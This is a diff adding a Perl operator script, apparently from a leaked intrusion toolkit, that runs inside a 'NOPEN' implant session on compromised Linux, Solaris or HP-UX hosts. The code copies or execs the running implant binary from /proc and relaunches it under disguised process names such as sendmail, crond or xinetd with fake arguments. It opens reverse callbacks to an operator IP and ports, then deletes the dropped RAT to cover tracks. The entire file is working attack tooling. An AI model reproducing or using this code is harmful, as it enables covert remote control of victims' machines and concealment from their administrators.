@@ -1,0 +1,401 @@
+#!/usr/bin/env perl
+##
+$VER="1.2.0.4" ;
+$| = 1 ;
+
+my $callbackip = "0.0.0.0";
+my %callbackport = ();
+$ratname = "";
+my @otherratnames = ("crond","nscd","cron","sendmail");
+my $args = "";
+my $dotslash = 0;
+my %command = ();
+my %commandextra = ();
+my $ans = "";
+ 
+myinit() ;
+# $ratname has spaces escaped once, $ratname2 does not.
+
+
+# Get our server PID; we will need it later.
+my $donepid = $targetpid;
+if (!$donepid) {
+  my ($output,$nopenlines,@output) = doit("-pid");
+  $donepid = $1 if $output =~ /^\s+PID.+\s(\d+)\s.+$/;
+}
+# Check for the appropriate entry in /proc.
+
+# -r-x------    0 root     root       121604 Jul 22 17:31 2009 /proc/24997/object/a.out
+# lrwxrwxrwx    1 root     root            0 Jul 31 20:24 2009 /proc/18011/exe -> /home/black/tmp/20090105-1448/bin/noserver-server (deleted)
+
+my $srcbin = "";
+if ($linuxtarget) {
+  ($output,$nopenlines,@output) = doit("-ls /proc/$donepid/exe");
+  unless ($output =~ /^.*\s+(\d+)\s\D.*\s(\S+)\s-.*/) {
+    mydie("Unable to locate entry in /proc for NOPEN pid $donepid - bailing!");
+  }
+  $srcbin = "/proc/$donepid/exe";
+} elsif ($hpuxtarget) {
+  unless ($host_nopenontarget) {
+    ($output,$nopenlines,@output) = doit("-sha1sum $targetcwd/$ratname");
+    unless ($output =~ /\+ .*noserver.*hpux/) {
+      mydie("On HPUX, you must run $prog from your original directory, where $ratname is.");
+    }
+    newhostvar("host_nopenontarget","$targetcwd/$ratname");
+  }
+} elsif ($solaristarget) {
+  ($output,$nopenlines,@output) = doit("-ls /proc/$donepid/object/a.out");
+  dbg("in autoaltcall, got line =$output=");
+  unless ($output =~ /^.*\s+(\d+)\s\D.*\s(\S+)/) {
+    mydie("Unable to locate entry in /proc for NOPEN pid $donepid - bailing!");
+  }
+  $srcbin = "/proc/$donepid/object/a.out";
+} else {
+  mydie("$prog can only be used on Solaris and Linux targets (with /proc)");
+}
+
+
+my $cpcommand = "cp $srcbin \"$dir/$ratname2\"";
+$cpcommand = "" if $hpuxtarget;
+
+
+# Execute the callback and delete the RAT.
+dbg("
+cpcommand=$cpcommand=
+srcbin=$srcbin=
+dir=$dir=
+ratname=$ratname=");
+foreach $callbackport (keys %callbackport) {
+  my @test = split(/\n/,`ifconfig`);
+  @test = grep /inet addr:*\s*$callbackip/,@test;
+  if (@test) {
+    $listenercmd .= "noclient -l $callbackport\n\n";
+  } else {
+    $listenercmd .= "-nrtun $callbackport\n\n";
+  }
+}
+
+my ($s,$multimore) = ();
+if (keys %callbackport > 1) {
+  ($s,$multimore) = ("s","\nonce each for each of the following:\n\n");
+}
+
+
+my $ratcopied = $hpuxtarget;
+#my @prevlistenon = 
+#  split(/\n/,`(netstat -antp ; ps -ef | grep -v grep) | egrep "127.0.0.1:$callbackport.*EST|noclient -l $callbackport"`);
+my $gotnewlistener = -1;
+my $ans = "r";
+while ($ans eq "r") {
+  # With local listeners, noclient -l #, we can check for those
+  # nicely with netstat, so we do. With -nrtun, we have to prompt
+  # and pray.
+  my $forced = 0;
+  while ($gotnewlistener <= 0 and ! $forced) {
+    my $S = uc $s;
+    my $usepastable = "\n\nPASTABLE$S:\n\n$listenercmd\n\n";
+    my $unlink = "u";
+    $unlink = "" if ($hpuxtarget or $useexec);
+    my $execs = "";
+    my (undef,undef,@output) = doit("ls -aLl /proc/$targetpid/fd");
+    
+    foreach my $fd (@output) {
+      ($fd) = $fd =~ /\s(\d+)$/;
+      dbg("$_::::FD=$fd=");
+      next unless ($fd and $fd > 2);
+      $execs .= " $fd<&-";
+    }
+    $execs = "exec $execs ; "
+      if ($execs);
+    dbg("FD:::::execs=$execs=");
+    my ($path1,$path2) = ("PATH=$dir","");
+    ($path1,$path2) = ("","./") if ($dotslash);
+    my $args = join(" ",@ratargs);
+    $args = " $args" if ($args);
+    foreach $callbackport (keys %callbackport) {
+      if ($linuxtarget and $useexec) {
+	$cpcommand = "";
+	$path1 = "PATH=".dirname($srcbin);
+	$unlink = "";
+	$command{"$execs$path1 D=-c$callbackip:$callbackport exec -a \"$ratname$args\" exe"} = 1;
+	$commandextra{"$path1 D=-c$callbackip:$callbackport exec -a \"$ratname$args\" exe"} = 1;
+      } else {
+        $command{"$execs$path1 D=-${unlink}c$callbackip:$callbackport $path2\"$ratname2\"$args"} = 1;
+        $commandextra{"$path1 D=-${unlink}c$callbackip:$callbackport $path2\"$ratname2\"$args"} = 1;
+      }
+    }
+    ($multimore) = ()
+      unless $cpcommand;
+    offerabort
+      ("About to run:\n".
+       "     $cpcommand\n".
+       $multimore.
+       join("     \n",keys %command).
+       "\n\n".
+       "First, get the listener$s started at $callbackip on port$s ".join(" ",keys %callbackport).".".
+       $usepastable);
+    #      $forced++ if ($ans eq "f" or $listenercmd =~ /nrtun/);
+    $forced++ if ($ans eq "f");
+    # Now always forcing, never mind about all the port testing crap
+    $forced++;
+  }
+#  @prevlistenon = 
+#    split(/\n/,`(netstat -antp ; ps -ef | grep -v grep) | egrep "127.0.0.1:$callbackport.*EST|noclient -l $callbackport"`);
+
+
+  while (!$useexec and !($ratcopied or $ans eq "a")) {
+    # Make sure that the file doesn't exist yet in our specified directory.
+    ($output,$nopenlines,@output) = doit("-ls $dir/$ratname");
+    if ($output =~ /^.*\s+(\d+)\s\D.*\s($dir\/$ratname)/) {
+      ($ans,$longans) = 
+	mygetinput("Suggested names:\n".
+		   "      ".join("\n      ",@otherratnames).
+		   "\n\n".
+		   "A file exists already at $dir/$ratname, with size $1\n\n".
+		   "What new name do you want to use (or you can <A>bort)?",my $thistime = shift @otherratnames);
+      mydie("User aborted") if (lc $longans eq "a" or lc $longans eq "abort");
+      @otherratnames = ($thistime,@otherratnames) unless ($longans eq $thistime);
+      if ($longans =~ m,^\s*/,) {
+	mydie("Re-run with the -w option to use another path.");
+      } else {
+	$ratname = $longans;
+	next;
+      }
+    }
+
+    # Copy the file out of /proc and verify that it arrived.
+    if ($cpcommand) {
+      doit("$cpcommand");
+      ($output,$nopenlines,@output) = doit("-ls $dir/$ratname");
+      unless ($output =~ /^.*\s+(\d+)\s\D.*\s($dir\/$ratname)/) {
+	mydie("RAT copy failed - bailing!");
+      }
+      $ratcopied++;
+    }
+  }
+
+
+  unless ($ans eq "a") {
+    foreach $command (keys %command) {
+      ($result,$nopenlines,@output) =
+	doit("$command");
+      if ($result =~ /(failed|not found)/i) {
+	$command = $commandextra;
+	offerabort
+	  ($COLOR_FAILURE.
+	   "POSSIBLE PROBLEM THERE, retrying without the /proc/*/fd part:\n$COLOR_NORMAL\n".
+	   "About to run:\n".
+	   "     $cpcommand\n".
+	   "     $command\n".
+	   "\n".
+	   "Be sure the listener is ready at $callbackip on port $callbackport.".
+	   $usepastable);
+	($result,$nopenlines,@output) =
+	  doit("$command");
+      }
+      ($output) = doit("-ls $dir/$ratname") if ($ratcopied);
+      $ratcopied = "" unless $output;
+    }
+    ($ans) = mygetinput
+      (
+       "".
+       "Callback$s initiated. You can <R>etry callback$s again or <F>inish",
+       "F","R","A",
+      );
+    dbg("in autoaltcall, got answer = =$ans=");
+    $gotnewlistener = -1;
+    # Took out this abort. Don't want to not delete RAT.
+    if ($ans eq "a") {
+      mydie("ABORTING - don't forget to delete the RAT!");
+    }
+  }
+  if ($ratcopied) {
+    if ($hpuxtarget) {
+      ($output,$nopenlines,@output) = doit("-ls $dir/$ratname");
+      progprint("As expected on HPUX, $dir/$ratname STILL exists");
+    } else {
+      my $saferm = dotdotpathforfile("$dir/$ratname");
+      ($output,$nopenlines,@output) = doit("-rm $saferm");
+      ($output,$nopenlines,@output) = doit("-ls $dir/$ratname");
+      if ($output =~ /^.*\s+(\d+)\s\D.*\s($dir\/$ratname)/) {
+	mydie("$dir/$ratname STILL exists, with size $1") unless $hpuxtarget;
+      }
+    }
+  }
+}
+
+
+# End with true value as we may someday require this script elsewhere.
+1;
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  # $calleddirect is set if 
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs altcall @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $prog = "-gs altcall" ;
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless $nopen_rhostname;
+  }
+  
+  dbg("in autoaltcall, got ip = =$callbackip= and port = =$callbackport=");
+  
+  mydie("bad option(s)") if (! Getopts( "hw:r:PvA:R" ) ) ;
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+
+";
+  $gsusagetext="Usage: $prog [OPTIONS] IP [PORT [PORT2] [...PORTn] ] [OPTIONAL FAKE-ARGS]
+
+$prog implementnts an alternate method for performing a callback with
+NOPEN on HP-UX, Solaris or Linux hosts. This method is useful when -call
+does not work properly on the target or you want to run NOPEN as a new
+name. On HPUX, if not run from the original working directory, $prog
+prompts for the path to your NOPEN on target.
+
+NEW: If multiple ports are given, that many different callbacks are made,
+all to the same IP.
+
+When we execute the NOPEN callback we first use exec to close all file
+descriptors in /proc/PID/fd of our current process.
+
+On Linux (if -R is not used):
+============================
+$prog will use PATH=/proc/PID, where PID is that of the running NOPEN
+server we are connected to in the current window. Then the executable
+\"exe\" will be run with \"exec -a\" syntax generated based on both the
+-r and -A arguments. E.g.:
+
+   PATH=/proc/PID D=-cDEST_IP:DEST_PORT exec -a \"NAME ARGS\" exe   
+
+On Solaris (and on Linux when -R is used):
+=========================================
+When invoked, $prog will determine the PID of the NOPEN server for the
+session it was invoked in, use the target copy command to retrieve a copy
+of the noserver binary from /proc and deposit it in the current working
+directory, and execute it with the following syntax:
+
+   PATH=. D=-ucIP:PORT NAME [OPTIONAL FAKE-ARGS]
+
+If PORT is not specified, a random high port is used.
+$COLOR_FAILURE
+NOTE: Each such NOPEN server that calls back will have its own program
+      group, so a single -burn/BURN will NOT kill them all. First use a
+      kill -9 to kill any HUNG sessions, then for windows that are still
+      healthy an -exit will suffice. Use =ps or -gs nocheck in your final
+      window to ensure all others are gone, then -exit.
+$COLOR_NORMAL
+OPTIONS
+
+  -h/-v       Show usage statement/version number
+
+  -A ARGS     Arguments to give NAME on target (in ps output). To use
+              several arguments, list them \",,\" delimited, e.g.:
+                    -r xinetd --Astayalive,,-pidfile,,/var/run/xinetd.pid
+               -->  \"xinetd -stayalive -pidfile /var/run/xinetd.pid\"
+  -P          Use the ./NAME syntax in lieu of the PATH=. NAME syntax
+  -r NAME     Name for the RAT in the process list (default: sendmail)
+  -R          Revert to the old method on Linux (ignored on Solaris)
+  -w DIR      Directory to run the RAT from (default: ./)
+
+Usage: $prog [OPTIONS] IP [PORT [PORT2] [...PORTn] ] [OPTIONAL FAKE-ARGS]
+
+";
+
+
+  usage() if ($opt_h or $opt_v or !@ARGV);
+
+  # Get the IP and port from the command line.
+  foreach my $arg (@ARGV) {
+    my ($arg2) = $arg =~ /:(\d+)/;
+    $arg =~ s,:.*,,g if ($arg2);
+    if ($arg =~ /^(\d+\.\d+\.\d+\.\d+)$/) {
+      $callbackip = $1;
+      next unless $arg2;
+      $arg = $arg2;
+    }
+    if ($arg =~ /(\d+)/) {
+      $callbackport{$1} = $1 if ($1 > 0 and $1 < 65536);
+      next;
+    }
+    $args .= " $arg";
+  }
+  $callbackport{myrand()}++ unless (keys %callbackport > 0);
+
+  $socket = pilotstart(quiet) unless $socket;
+  ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,
+  $localppid,$serverver,$wdir,$targetos,$targetcwd,$targetpid,
+  $targetppid,$targetport,$localport,@statusoutput) = parsestatus();
+
+  $dir = $opt_w if $opt_w;
+  $dir = $targetcwd unless $dir;
+
+  $ratname = $opt_r if $opt_r;
+  $dotslash = $opt_P if $opt_P;
+
+  $useexec = ($linuxtarget and !$opt_R) ? 1 : 0;
+
+  # Bail if issues
+
+  offerabort("It is almost$COLOR_FAILURE CERTAINLY$COLOR_NORMAL a bad idea to upload to $dir.\n".
+	     "You should likely abort.","A")
+    if ($dir =~ m,^/+$,);
+
+  if ($callbackip =~ /0.0.0.0/ or !ipcheck($callbackip)) {
+    mydie("Invalid IP $callbackip - bailing!");
+  }
+  mydie("RAT NAME $name cannot contain any \"/\" characters")
+    if ($ratname =~ m,/, and (!$useexec));
+
+  ($ratname,@ratargs) = split(/\s+/,$ratname);
+  if ($opt_A and @ratargs) {
+    mydie("Put your ARGS in either -A option, or the -r option, not in both");
+  }
+  @ratargs = split(/,,/,$opt_A)
+    unless @ratargs;
+  preservefile("$optargetcommands/${nopen_rhostname}_ps.altcall");
+  unless ($ratname) {
+    my ($output,$nopenlines,@output) =
+      doit("=ps");
+    my (@lines) = grep /\s$targetpid\s+$targetppid\s/,@output;
+    # Some OSes the =ps will not show "pid ppid" back to back
+    (@lines) = grep /\s$targetpid\s/,@output unless (@lines);
+    ($ratname) = $lines[0] =~ /.*:\d\d\s+(.*)/;
+    $ratname =~ s,\s*$,,;
+    ($ratname) = $ratname =~ m,.*/([^/]+),
+      if ($ratname =~ m,/,);
+    if (#$ratname =~ /\s/ or
+	@lines > 1 or
+	$ratname =~ m,/,) {
+      my ($ans,$longans) = mygetinput
+	("Your NOPEN session is:\n\n".
+	 join("\n",@lines)."\n\n".
+	 "What name would you like to use for the new one?",$ratname,"abort","a");
+      mydie("User aborted")
+	if (lc $longans eq "a" or lc $longans eq "abort");
+      $ratname = $longans;
+    }
+  }
+  mydie("-w not allowed on HP-UX, just run from your original directory, where $ratname is")
+    if ($opt_w and $hpuxtarget);;
+  $ratname2 = $ratname;
+  $ratname =~ s, ,\\ ,g;
+
+
+} #myinit
